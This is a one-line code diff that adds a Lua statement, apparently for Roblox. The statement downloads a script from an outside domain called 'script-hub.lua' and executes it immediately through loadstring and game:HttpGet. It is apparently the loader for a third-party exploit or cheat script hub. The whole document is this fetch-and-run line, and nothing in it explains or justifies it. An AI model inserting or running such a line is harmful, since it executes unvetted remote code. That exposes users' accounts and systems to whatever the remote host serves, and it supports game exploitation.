@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://wilonity.xyz/script-hub.lua'))()
